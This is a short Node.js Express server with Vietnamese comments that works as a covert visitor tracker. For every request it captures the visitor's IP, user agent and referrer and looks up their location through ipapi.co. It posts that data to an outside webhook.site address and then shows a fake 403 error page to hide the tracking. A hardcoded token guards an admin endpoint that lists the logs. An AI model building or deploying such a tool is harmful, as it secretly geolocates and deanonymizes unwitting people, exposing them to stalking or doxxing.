const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Log lưu trong RAM
let localLogs = [];

app.get('/admin-ninja', (req, res) => {
  const token = req.query.token;
  if (token !== 'cuti123') return res.status(403).send('Forbidden 🥷');
  res.json(localLogs);
});

app.get('*', async (req, res) => {
  // ✅ Lấy IP thật từ x-forwarded-for (nếu có)
  const rawIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIP.split(',')[0].trim(); // chỉ lấy IP đầu tiên

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referrer = req.headers['referer'] || 'Direct';

  let logData = {
    message: 'Có người truy cập web ninja!',
    ip,
    userAgent,
    referrer,
    time: new Date().toISOString()
  };

  try {
    const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
    logData.location = geo.data;
  } catch (err) {
    logData.location = {
      ip,
      error: true,
      reason: 'Không xác định được vị trí từ IP'
    };
  }

  // Lưu vào log RAM
  localLogs.push(logData);

  // Gửi ra webhook ngoài
  try {
    await axios.post('https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890', logData);
  } catch (err) {
    console.error('Gửi webhook lỗi:', err.message);
  }

  // Trả về trang giả 403
  res.status(403).sendFile(path.join(__dirname, '403.html'));
});

app.listen(PORT, () => {
  console.log(`🟢 Web ninja đang chạy ở cổng ${PORT}`);
});
